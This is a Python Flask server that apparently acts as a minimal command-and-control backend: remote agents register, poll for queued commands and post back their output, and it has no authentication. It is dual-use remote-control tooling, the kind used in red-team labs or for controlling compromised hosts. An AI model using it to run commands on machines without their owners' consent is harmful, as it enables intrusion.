from flask import Flask, request, jsonify

app = Flask(__name__)
agents = {}  # Store registered agents
commands = {}  # Store commands for agents
results = {}  # New dict to store results

@app.route('/result', methods=['POST'])
def receive_result():
    """Receives command output from agent"""
    data = request.json
    agent_id = data.get('id')
    output = data.get('output')
    results[agent_id] = output
    print(f"[+] Received result from {agent_id}")
    return jsonify({"message": "Result received"}), 200

@app.route('/result/<agent_id>', methods=['GET'])
def get_result(agent_id):
    """Console fetches command output"""
    if agent_id in results:
        output = results.pop(agent_id)  # return & clear
        return jsonify({"output": output}), 200
    return jsonify({"output": ""})


@app.route('/register', methods=['POST'])
def register_agent():
    """Registers a new agent"""
    data = request.json
    agent_id = data.get('id')
    agents[agent_id] = data  # Store agent details
    commands[agent_id] = None  # No command initially
    print(f"[+] New agent registered: {agent_id}")
    return jsonify({"message": "Agent registered"}), 200

@app.route('/list_agents', methods=['GET'])
def list_agents():
    """Returns a list of all registered agents"""
    return jsonify(list(agents.keys()))

@app.route('/command', methods=['POST'])
def send_command():
    """Sends a command to an agent"""
    data = request.json
    agent_id = data.get('id')
    command = data.get('command')

    if agent_id in agents:
        commands[agent_id] = command  # Store command for agent
        return jsonify({"message": f"Command '{command}' sent to {agent_id}"}), 200
    else:
        return jsonify({"error": "Agent not found"}), 404

@app.route('/command/<agent_id>', methods=['GET'])
def get_command(agent_id):
    """Agent fetches its assigned command"""
    if agent_id in commands and commands[agent_id]:
        cmd = commands[agent_id]
        commands[agent_id] = None  # Clear command after execution
        return jsonify({"command": cmd}), 200
    return jsonify({"command": ""})  # Return empty command if none

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

